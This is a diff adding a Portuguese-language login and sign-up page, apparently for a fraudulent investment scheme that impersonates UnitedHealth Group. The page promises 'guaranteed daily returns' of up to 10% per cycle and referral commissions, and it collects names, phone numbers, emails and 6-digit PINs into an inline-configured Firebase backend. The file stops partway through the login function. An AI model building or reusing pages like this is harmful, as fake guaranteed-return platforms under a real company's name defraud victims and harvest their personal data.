@@ -1,0 +1,1049 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <title>UnitedHealth — Autenticacao</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #f0f2f5;
+      --glass-bg: rgba(255,255,255,0.55);
+      --glass-border: rgba(255,255,255,0.75);
+      --green: rgba(34,197,94,0.82);
+      --green-solid: #16a34a;
+      --blue: rgba(0,123,255,0.88);
+      --blue-solid: #007bff;
+      --text-primary: #0f172a;
+      --text-secondary: #475569;
+      --text-muted: #94a3b8;
+      --alert-bg: rgba(0,123,255,0.10);
+      --alert-border: rgba(0,123,255,0.28);
+      --error-bg: rgba(239,68,68,0.10);
+      --error-border: rgba(239,68,68,0.28);
+      --success-bg: rgba(34,197,94,0.10);
+      --success-border: rgba(34,197,94,0.28);
+      --radius: 18px;
+      --shadow: 0 8px 40px rgba(0,0,0,0.10);
+    }
+
+    html, body {
+      height: 100%;
+      font-family: 'Inter', sans-serif;
+      background: var(--bg);
+      color: var(--text-primary);
+      overflow-x: hidden;
+    }
+
+    body::before, body::after {
+      content: '';
+      position: fixed;
+      border-radius: 50%;
+      filter: blur(80px);
+      pointer-events: none;
+      z-index: 0;
+    }
+    body::before {
+      width: 420px; height: 420px;
+      background: radial-gradient(circle, rgba(34,197,94,0.18) 0%, transparent 70%);
+      top: -120px; left: -100px;
+    }
+    body::after {
+      width: 380px; height: 380px;
+      background: radial-gradient(circle, rgba(0,123,255,0.13) 0%, transparent 70%);
+      bottom: -100px; right: -80px;
+    }
+
+    .page-wrapper {
+      position: relative;
+      z-index: 1;
+      min-height: 100dvh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: env(safe-area-inset-top, 0) 0 env(safe-area-inset-bottom, 0);
+    }
+
+    .info-banner {
+      width: 100%;
+      background: var(--alert-bg);
+      border-bottom: 1px solid var(--alert-border);
+      padding: 10px 20px;
+      text-align: center;
+      font-size: 12px;
+      color: var(--blue-solid);
+      font-weight: 500;
+      letter-spacing: 0.01em;
+      backdrop-filter: blur(10px);
+    }
+
+    .auth-container {
+      width: 100%;
+      max-width: 440px;
+      padding: 20px 16px 40px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .logo-wrap {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+      padding-top: 6px;
+    }
+    .logo-img {
+      width: 180px;
+      height: 72px;
+      object-fit: contain;
+      border-radius: 12px;
+    }
+    .logo-tagline {
+      font-size: 11.5px;
+      color: var(--text-muted);
+      font-weight: 500;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    /* ── Invite banner shown when ref param detected ── */
+    .invite-banner {
+      width: 100%;
+      padding: 12px 16px;
+      background: var(--success-bg);
+      border: 1px solid var(--success-border);
+      border-radius: 13px;
+      display: none;
+      align-items: center;
+      gap: 10px;
+      font-size: 13px;
+      color: var(--green-solid);
+      font-weight: 500;
+    }
+    .invite-banner.show { display: flex; }
+    .invite-banner svg { flex-shrink: 0; }
+
+    .tab-switcher {
+      display: flex;
+      width: 100%;
+      background: rgba(255,255,255,0.45);
+      border: 1px solid var(--glass-border);
+      border-radius: 14px;
+      padding: 4px;
+      backdrop-filter: blur(12px);
+      gap: 4px;
+    }
+    .tab-btn {
+      flex: 1;
+      padding: 10px 0;
+      border: none;
+      border-radius: 11px;
+      background: transparent;
+      font-family: 'Inter', sans-serif;
+      font-size: 13.5px;
+      font-weight: 600;
+      color: var(--text-muted);
+      cursor: pointer;
+      transition: all 0.22s ease;
+      letter-spacing: 0.01em;
+    }
+    .tab-btn.active {
+      background: var(--green);
+      color: #fff;
+      box-shadow: 0 4px 16px rgba(34,197,94,0.22);
+    }
+    .tab-btn:active { transform: scale(0.96); }
+
+    .glass-card {
+      width: 100%;
+      background: var(--glass-bg);
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius);
+      padding: 28px 24px;
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+      box-shadow: var(--shadow);
+    }
+
+    .card-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--text-primary);
+      margin-bottom: 4px;
+    }
+    .card-subtitle {
+      font-size: 13px;
+      color: var(--text-secondary);
+      margin-bottom: 22px;
+      line-height: 1.5;
+    }
+
+    .form-group { margin-bottom: 16px; position: relative; }
+    .form-label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-secondary);
+      margin-bottom: 6px;
+      letter-spacing: 0.03em;
+      text-transform: uppercase;
+    }
+    .input-wrap { position: relative; display: flex; align-items: center; }
+    .input-icon {
+      position: absolute;
+      left: 14px;
+      color: var(--text-muted);
+      pointer-events: none;
+      display: flex;
+      align-items: center;
+    }
+    .form-input {
+      width: 100%;
+      padding: 13px 14px 13px 42px;
+      background: rgba(255,255,255,0.65);
+      border: 1.5px solid rgba(203,213,225,0.65);
+      border-radius: 12px;
+      font-family: 'Inter', sans-serif;
+      font-size: 14px;
+      color: var(--text-primary);
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .form-input::placeholder { color: var(--text-muted); }
+    .form-input:focus {
+      border-color: var(--blue-solid);
+      box-shadow: 0 0 0 3px rgba(0,123,255,0.10);
+      background: rgba(255,255,255,0.85);
+    }
+    /* Invite field locked style */
+    .form-input[readonly] {
+      background: rgba(34,197,94,0.07);
+      border-color: rgba(34,197,94,0.40);
+      color: var(--green-solid);
+      font-weight: 600;
+    }
+    .invite-lock-icon {
+      position: absolute;
+      right: 14px;
+      color: var(--green-solid);
+      display: none;
+      align-items: center;
+    }
+    .invite-lock-icon.show { display: flex; }
+
+    .pass-toggle {
+      position: absolute;
+      right: 14px;
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      padding: 4px;
+      border-radius: 6px;
+      transition: color 0.15s;
+    }
+    .pass-toggle:hover { color: var(--text-primary); }
+
+    .pin-group { display: flex; gap: 8px; justify-content: center; }
+    .pin-input {
+      width: 46px;
+      height: 52px;
+      text-align: center;
+      font-size: 20px;
+      font-weight: 700;
+      background: rgba(255,255,255,0.65);
+      border: 1.5px solid rgba(203,213,225,0.65);
+      border-radius: 12px;
+      font-family: 'Inter', sans-serif;
+      color: var(--text-primary);
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      caret-color: var(--blue-solid);
+    }
+    .pin-input:focus {
+      border-color: var(--blue-solid);
+      box-shadow: 0 0 0 3px rgba(0,123,255,0.10);
+    }
+
+    .btn-primary {
+      width: 100%;
+      padding: 14px;
+      background: var(--blue);
+      border: 1px solid rgba(0,123,255,0.35);
+      border-radius: 13px;
+      font-family: 'Inter', sans-serif;
+      font-size: 14.5px;
+      font-weight: 700;
+      color: #fff;
+      cursor: pointer;
+      letter-spacing: 0.02em;
+      transition: transform 0.12s ease, box-shadow 0.2s, background 0.2s;
+      backdrop-filter: blur(6px);
+      box-shadow: 0 4px 18px rgba(0,123,255,0.22);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 6px;
+    }
+    .btn-primary:hover { background: rgba(0,123,255,0.96); box-shadow: 0 6px 22px rgba(0,123,255,0.30); }
+    .btn-primary:active { transform: scale(0.965); box-shadow: 0 2px 8px rgba(0,123,255,0.15); }
+    .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+    .btn-link {
+      background: none;
+      border: none;
+      color: var(--blue-solid);
+      font-family: 'Inter', sans-serif;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 4px 0;
+      transition: opacity 0.15s;
+      text-decoration: underline;
+      text-underline-offset: 3px;
+    }
+    .btn-link:hover { opacity: 0.75; }
+
+    .alert {
+      width: 100%;
+      padding: 12px 16px;
+      border-radius: 12px;
+      font-size: 13px;
+      line-height: 1.5;
+      font-weight: 500;
+      display: none;
+      align-items: flex-start;
+      gap: 10px;
+    }
+    .alert.show { display: flex; }
+    .alert-info { background: var(--alert-bg); border: 1px solid var(--alert-border); color: var(--blue-solid); }
+    .alert-error { background: var(--error-bg); border: 1px solid var(--error-border); color: #dc2626; }
+    .alert-success { background: var(--success-bg); border: 1px solid var(--success-border); color: var(--green-solid); }
+    .alert-icon { flex-shrink: 0; margin-top: 1px; }
+
+    .forgot-row { display: flex; justify-content: flex-end; margin-top: -8px; margin-bottom: 8px; }
+
+    .field-hint { font-size: 11.5px; color: var(--text-muted); margin-top: 5px; line-height: 1.45; }
+
+    .spinner {
+      width: 18px; height: 18px;
+      border: 2.5px solid rgba(255,255,255,0.35);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.75s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(15,23,42,0.45);
+      backdrop-filter: blur(6px);
+      z-index: 100;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+    .modal-overlay.show { display: flex; }
+
+    .modal-card {
+      background: rgba(255,255,255,0.88);
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius);
+      padding: 30px 24px;
+      width: 100%;
+      max-width: 380px;
+      backdrop-filter: blur(20px);
+      box-shadow: 0 20px 60px rgba(0,0,0,0.18);
+      animation: slideUp 0.28s ease;
+      position: relative;
+    }
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .modal-title { font-size: 18px; font-weight: 700; margin-bottom: 6px; }
+    .modal-subtitle { font-size: 13px; color: var(--text-secondary); margin-bottom: 20px; line-height: 1.5; }
+    .modal-close {
+      position: absolute;
+      top: 16px; right: 16px;
+      background: rgba(241,245,249,0.8);
+      border: none;
+      border-radius: 8px;
+      width: 32px; height: 32px;
+      cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      color: var(--text-secondary);
+      transition: background 0.15s;
+    }
+    .modal-close:hover { background: rgba(226,232,240,0.9); }
+
+    .info-section { width: 100%; display: flex; flex-direction: column; gap: 10px; }
+    .info-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      padding: 12px 14px;
+      background: rgba(255,255,255,0.45);
+      border: 1px solid var(--glass-border);
+      border-radius: 13px;
+      backdrop-filter: blur(10px);
+    }
+    .info-item-icon {
+      width: 32px; height: 32px;
+      border-radius: 9px;
+      background: var(--alert-bg);
+      border: 1px solid var(--alert-border);
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      color: var(--blue-solid);
+    }
+    .info-item-text { flex: 1; }
+    .info-item-title { font-size: 12.5px; font-weight: 700; color: var(--text-primary); margin-bottom: 2px; }
+    .info-item-desc { font-size: 11.5px; color: var(--text-secondary); line-height: 1.4; }
+
+    .auth-footer { text-align: center; font-size: 11px; color: var(--text-muted); padding-bottom: 20px; line-height: 1.6; }
+
+    .view { display: none; }
+    .view.active { display: block; }
+  </style>
+</head>
+<body>
+
+<div class="info-banner">
+  Plataforma regulamentada de investimentos em saude. Os seus dados estao protegidos com encriptacao de nivel bancario.
+</div>
+
+<div class="page-wrapper">
+  <div class="auth-container">
+
+    <div class="logo-wrap">
+      <img class="logo-img" src="https://i.postimg.cc/52KCd9nR/Client-Story-United-Healthcare.jpg" alt="UnitedHealth Group" />
+      <span class="logo-tagline">Plataforma de Investimentos em Saude</span>
+    </div>
+
+    <!-- Shown only when ?ref= detected in URL -->
+    <div class="invite-banner" id="inviteBanner">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      <span id="inviteBannerText">Convite detectado! O ID foi preenchido automaticamente.</span>
+    </div>
+
+    <div class="tab-switcher">
+      <button class="tab-btn active" onclick="switchTab('login')">Entrar</button>
+      <button class="tab-btn" onclick="switchTab('register')">Criar Conta</button>
+    </div>
+
+    <div class="alert alert-info" id="globalAlert">
+      <div class="alert-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+      </div>
+      <span id="globalAlertText"></span>
+    </div>
+
+    <!-- ── LOGIN VIEW ── -->
+    <div class="glass-card view active" id="viewLogin">
+      <div class="card-title">Bem-vindo de volta</div>
+      <div class="card-subtitle">Aceda a sua conta com seguranca e gerencie os seus investimentos.</div>
+
+      <div class="form-group">
+        <label class="form-label">Endereco de E-mail</label>
+        <div class="input-wrap">
+          <span class="input-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+          </span>
+          <input class="form-input" type="email" id="loginEmail" placeholder="exemplo@email.com" autocomplete="email" />
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Senha</label>
+        <div class="input-wrap">
+          <span class="input-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          </span>
+          <input class="form-input" type="password" id="loginPassword" placeholder="A sua senha" autocomplete="current-password" />
+          <button class="pass-toggle" type="button" onclick="togglePass('loginPassword', this)">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="forgot-row">
+        <button class="btn-link" onclick="openForgot()">Esqueci a senha</button>
+      </div>
+
+      <button class="btn-primary" id="btnLogin" onclick="handleLogin()">
+        <span id="loginBtnText">Entrar na Conta</span>
+        <span id="loginSpinner" style="display:none"><div class="spinner"></div></span>
+      </button>
+    </div>
+
+    <!-- ── REGISTER VIEW ── -->
+    <div class="glass-card view" id="viewRegister">
+      <div class="card-title">Criar Conta</div>
+      <div class="card-subtitle">Preencha os dados abaixo para comecar a investir em saude.</div>
+
+      <div class="form-group">
+        <label class="form-label">Nome Completo</label>
+        <div class="input-wrap">
+          <span class="input-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+          </span>
+          <input class="form-input" type="text" id="regName" placeholder="Nome e sobrenome" autocomplete="name" />
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Numero de Telefone</label>
+        <div class="input-wrap">
+          <span class="input-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.15 12 19.79 19.79 0 0 1 1.05 3.4 2 2 0 0 1 3 1h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.09 8.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 21 16z"/></svg>
+          </span>
+          <input class="form-input" type="tel" id="regPhone" placeholder="+244 9XX XXX XXX" autocomplete="tel" />
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Endereco de E-mail</label>
+        <div class="input-wrap">
+          <span class="input-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+          </span>
+          <input class="form-input" type="email" id="regEmail" placeholder="exemplo@email.com" autocomplete="email" />
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Senha de 6 Digitos</label>
+        <div class="pin-group" id="pinGroup">
+          <input class="pin-input" type="password" inputmode="numeric" maxlength="1" data-index="0" />
+          <input class="pin-input" type="password" inputmode="numeric" maxlength="1" data-index="1" />
+          <input class="pin-input" type="password" inputmode="numeric" maxlength="1" data-index="2" />
+          <input class="pin-input" type="password" inputmode="numeric" maxlength="1" data-index="3" />
+          <input class="pin-input" type="password" inputmode="numeric" maxlength="1" data-index="4" />
+          <input class="pin-input" type="password" inputmode="numeric" maxlength="1" data-index="5" />
+        </div>
+        <div class="field-hint">Utilize apenas numeros. Esta sera a sua senha de acesso.</div>
+      </div>
+
+      <!-- Invite ID field — auto-filled + locked if ?ref= present -->
+      <div class="form-group">
+        <label class="form-label">
+          ID de Convite <span style="color:var(--text-muted);font-weight:400">(opcional)</span>
+        </label>
+        <div class="input-wrap">
+          <span class="input-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+          </span>
+          <input class="form-input" type="text" id="regInvite" placeholder="ID fornecido por quem o convidou" />
+          <!-- Lock icon shown when auto-filled -->
+          <span class="invite-lock-icon" id="inviteLockIcon">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          </span>
+        </div>
+        <div class="field-hint" id="inviteHint">Se possui um ID de convite, insira-o para que o seu referenciador receba a comissao correspondente.</div>
+      </div>
+
+      <button class="btn-primary" id="btnRegister" onclick="handleRegister()">
+        <span id="regBtnText">Criar Conta Agora</span>
+        <span id="regSpinner" style="display:none"><div class="spinner"></div></span>
+      </button>
+    </div>
+
+    <!-- ── INFO SECTION ── -->
+    <div class="info-section">
+      <div class="info-item">
+        <div class="info-item-icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        </div>
+        <div class="info-item-text">
+          <div class="info-item-title">Seguranca de Nivel Bancario</div>
+          <div class="info-item-desc">Os seus dados e investimentos estao protegidos com encriptacao AES-256 e autenticacao multifator.</div>
+        </div>
+      </div>
+      <div class="info-item">
+        <div class="info-item-icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+        </div>
+        <div class="info-item-text">
+          <div class="info-item-title">Rendimentos Diarios Garantidos</div>
+          <div class="info-item-desc">Planos de saude com rendimentos de ate +10% por ciclo, respaldados pelo grupo UnitedHealth.</div>
+        </div>
+      </div>
+      <div class="info-item">
+        <div class="info-item-icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>
+        </div>
+        <div class="info-item-text">
+          <div class="info-item-title">Plano Gratuito Disponivel</div>
+          <div class="info-item-desc">Comece sem investimento inicial com o plano Optum Home Delivery e veja os seus ganhos crescer.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="auth-footer">
+      UnitedHealth Group — Plataforma de Investimentos<br>
+      Todos os direitos reservados. Ao utilizar esta plataforma, aceita os nossos Termos de Uso e Politica de Privacidade.
+    </div>
+
+  </div>
+</div>
+
+<!-- ── FORGOT PASSWORD MODAL ── -->
+<div class="modal-overlay" id="forgotOverlay" onclick="closeForgotOutside(event)">
+  <div class="modal-card">
+    <button class="modal-close" onclick="closeForgot()">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+    </button>
+    <div class="modal-title">Redefinir Senha</div>
+    <div class="modal-subtitle">Insira o seu e-mail cadastrado. Iremos enviar as instrucoes de redefinicao de senha.</div>
+
+    <div class="alert alert-info show" style="margin-bottom:16px;">
+      <div class="alert-icon">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+      </div>
+      <span>Verifique a sua caixa de entrada apos o envio, incluindo a pasta de spam.</span>
+    </div>
+
+    <div id="forgotAlert" class="alert" style="margin-bottom:14px;"></div>
+
+    <div class="form-group">
+      <label class="form-label">Endereco de E-mail</label>
+      <div class="input-wrap">
+        <span class="input-icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+        </span>
+        <input class="form-input" type="email" id="forgotEmail" placeholder="O seu e-mail cadastrado" />
+      </div>
+    </div>
+
+    <button class="btn-primary" id="btnForgot" onclick="handleForgot()">
+      <span id="forgotBtnText">Enviar Instrucoes</span>
+      <span id="forgotSpinner" style="display:none"><div class="spinner"></div></span>
+    </button>
+  </div>
+</div>
+
+<!-- Firebase SDK -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+  import {
+    getAuth,
+    signInWithEmailAndPassword,
+    createUserWithEmailAndPassword,
+    sendPasswordResetEmail,
+    updateProfile
+  } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+  import {
+    getFirestore,
+    doc,
+    setDoc,
+    getDoc,
+    serverTimestamp
+  } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDp02RqKrac4ogFRGDcJjPLpA2inOV2rsk",
+    authDomain: "pro-2c872.firebaseapp.com",
+    projectId: "pro-2c872",
+    storageBucket: "pro-2c872.firebasestorage.app",
+    messagingSenderId: "778229616930",
+    appId: "1:778229616930:web:b56177b322241b103ad57b"
+  };
+
+  const app  = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
+  const db   = getFirestore(app);
+
+  window._auth = auth;
+  window._db   = db;
+  window._fns  = {
+    signInWithEmailAndPassword,
+    createUserWithEmailAndPassword,
+    sendPasswordResetEmail,
+    updateProfile,
+    doc, setDoc, getDoc,
+    serverTimestamp
+  };
+
+  // ── Flag: set to true during login/register so onAuthStateChanged
+  //    does NOT redirect before Firestore data is fully saved ──
+  window._skipAuthRedirect = false;
+
+  // ── Only redirect if already logged in on page load ──
+  auth.onAuthStateChanged(user => {
+    if (user && !window._skipAuthRedirect) {
+      window.location.href = 'index.html';
+    }
+  });
+</script>
+
+<script>
+  /* ════════════════════════════════════════
+     1. AUTO-FILL INVITE ID FROM URL PARAM
+        e.g. acesso.html?ref=UH2B3X9A
+     ════════════════════════════════════════ */
+  (function applyRefParam() {
+    const params  = new URLSearchParams(window.location.search);
+    const refId   = params.get('ref') || params.get('convite') || params.get('invite');
+
+    if (!refId) return;
+
+    // Wait for DOM to be ready
+    const applyRef = () => {
+      const input   = document.getElementById('regInvite');
+      const lock    = document.getElementById('inviteLockIcon');
+      const hint    = document.getElementById('inviteHint');
+      const banner  = document.getElementById('inviteBanner');
+      const bannerT = document.getElementById('inviteBannerText');
+
+      if (!input) return;
+
+      // Fill + lock the field
+      input.value    = refId;
+      input.readOnly = true;
+      lock.classList.add('show');
+      hint.textContent = 'ID de convite aplicado automaticamente. O seu referenciador recebera a comissao.';
+      hint.style.color = 'var(--green-solid)';
+      hint.style.fontWeight = '600';
+
+      // Show top green banner
+      bannerT.textContent = `Convite de "${refId}" aplicado! Crie a sua conta para comecar.`;
+      banner.classList.add('show');
+
+      // Auto-switch to register tab so user sees the form
+      switchTab('register');
+    };
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', applyRef);
+    } else {
+      applyRef();
+    }
+  })();
+
+
+  /* ════════════════════════════════════════
+     2. TAB SWITCHER
+     ════════════════════════════════════════ */
+  function switchTab(tab) {
+    document.querySelectorAll('.tab-btn').forEach((b, i) => {
+      b.classList.toggle('active', (tab === 'login' && i === 0) || (tab === 'register' && i === 1));
+    });
+    document.getElementById('viewLogin').classList.toggle('active', tab === 'login');
+    document.getElementById('viewRegister').classList.toggle('active', tab === 'register');
+    hideAlert('globalAlert');
+  }
+
+
+  /* ════════════════════════════════════════
+     3. ALERT HELPERS
+     ════════════════════════════════════════ */
+  function showGlobal(msg, type) {
+    const el = document.getElementById('globalAlert');
+    el.className = `alert alert-${type} show`;
+    document.getElementById('globalAlertText').textContent = msg;
+  }
+  function hideAlert(id) {
+    document.getElementById(id).classList.remove('show');
+  }
+
+
+  /* ════════════════════════════════════════
+     4. PASSWORD VISIBILITY TOGGLE
+     ════════════════════════════════════════ */
+  function togglePass(inputId, btn) {
+    const inp  = document.getElementById(inputId);
+    const show = inp.type === 'password';
+    inp.type   = show ? 'text' : 'password';
+    btn.innerHTML = show
+      ? `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`
+      : `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
+  }
+
+
+  /* ════════════════════════════════════════
+     5. PIN INPUT NAVIGATION
+     ════════════════════════════════════════ */
+  document.addEventListener('DOMContentLoaded', () => {
+    const pins = document.querySelectorAll('.pin-input');
+    pins.forEach((inp, idx) => {
+      inp.addEventListener('input', e => {
+        const val = e.target.value.replace(/\D/g, '');
+        e.target.value = val ? val[0] : '';
+        if (val && idx < pins.length - 1) pins[idx + 1].focus();
+      });
+      inp.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !inp.value && idx > 0) pins[idx - 1].focus();
+      });
+      inp.addEventListener('paste', e => {
+        e.preventDefault();
+        const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+        text.split('').slice(0, 6).forEach((ch, i) => { if (pins[i]) pins[i].value = ch; });
+        if (pins[Math.min(text.length, 5)]) pins[Math.min(text.length, 5)].focus();
+      });
+    });
+  });
+
+  function getPinValue() {
+    return Array.from(document.querySelectorAll('.pin-input')).map(i => i.value).join('');
+  }
+
+
+  /* ════════════════════════════════════════
+     6. UNIQUE USER ID GENERATOR
+     ════════════════════════════════════════ */
+  function genId(prefix = 'UH') {
+    return prefix + Math.random().toString(36).substr(2, 8).toUpperCase();
+  }
+
+
+  /* ════════════════════════════════════════
+     7. FIREBASE ERROR MESSAGES (PT)
+     ════════════════════════════════════════ */
+  function fbError(code) {
+    const map = {
+      'auth/invalid-email':        'Endereco de e-mail invalido.',
+      'auth/user-not-found':       'Nenhuma conta encontrada com este e-mail.',
+      'auth/wrong-password':       'Senha incorreta. Verifique e tente novamente.',
+      'auth/invalid-credential':   'Credenciais invalidas. Verifique o e-mail e senha.',
+      'auth/email-already-in-use': 'Este e-mail ja esta associado a uma conta.',
+      'auth/weak-password':        'A senha deve ter pelo menos 6 caracteres.',
+      'auth/too-many-requests':    'Muitas tentativas. Aguarde alguns minutos antes de tentar novamente.',
+      'auth/network-request-failed': 'Sem conexao. Verifique a sua internet.',
+    };
+    return map[code] || 'Ocorreu um erro. Tente novamente.';
+  }
+
+
+  /* ════════════════════════════════════════
+     8. LOGIN
+        — After sign-in, ensures Firestore
+          user doc exists (creates if missing
+          e.g. for users created before this
+          update)
+     ════════════════════════════════════════ */
+  async function handleLogin() {
+    hideAlert('globalAlert');
+    const email = document.getElementById('loginEmail').value.trim();
+    const pass  = document.getElementById('loginPassword').value;
+
+    if (!email) return showGlobal('Insira o seu endereco de e-mail.', 'error');
+    if (!pass)  return showGlobal('Insira a sua senha.', 'error');
+
